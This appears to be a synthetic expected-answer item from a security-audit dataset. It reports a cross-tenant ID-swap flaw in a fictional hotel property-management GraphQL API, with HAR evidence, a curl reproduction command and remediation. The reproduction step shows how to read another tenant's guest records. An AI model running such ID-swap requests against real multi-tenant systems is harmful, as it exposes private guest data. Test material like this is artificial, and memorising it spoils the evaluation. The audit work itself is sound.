# Expected Response

## System
- Domain: Hospitality / Hotel PMS
- System: StayPro Property API
- Example ID: GQL-0130

## Priority Findings

### Finding 1: Hospitality PMS — ID Swap in Bulk Lookup Exposes Cross-Tenant Guest Data (Pattern 10.1)
**Severity:** High
**Category:** Single-User / ID Swap in Own Request

**Summary:**
Per §5.0 (Pattern 10.1 — ID swap in own request): The `bulkResourceLookup` resolver accepts arbitrary IDs without verifying tenancy, enabling an ID swap attack. An attacker from `tenant-d2d4` queried `bulkResourceLookup(ids: ["R-2130", "R-1130", "R-3130"])` and received hotel PMS data belonging to `tenant-e655`, including `CONFIDENTIAL-d2d4e655`. In Hospitality / Hotel PMS, this exposes guest reservation details, loyalty programme data, and room assignment records.

**Evidence from HAR:**
- Request: `POST https://api.staypro-property-api.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-d2d4`
- Query: `bulkResourceLookup(ids: ["R-2130", "R-1130", "R-3130"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-e655"`, `ownerId: "other-user-d2d4e655"`, `sensitiveField: "CONFIDENTIAL-d2d4e655"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-d2d4e655`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 10.1 | ID swap, no tenancy in bulk lookup |
| HAR request | ids array | R-2130, R-1130, R-3130 (cross-tenant) |
| HAR response | tenantId | tenant-e655 returned for tenant-d2d4 caller |
| HAR response | sensitiveField | CONFIDENTIAL-d2d4e655 |

## Steps to Reproduce

### Step 1 — Bulk ID swap lookup (HAR)
```bash
curl -s -X POST https://api.staypro-property-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-d2d4" \
  -d '{"query": "query { bulkResourceLookup(ids: [\"R-2130\", \"R-1130\", \"R-3130\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-e655` guest data returned. **Secure:** Only `tenant-d2d4` records or FORBIDDEN.

## Remediation
1. Bulk lookup: `WHERE resource_id = ANY($ids) AND tenant_id = $jwt.tenantId`.
2. Limit bulk array size to prevent enumeration.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
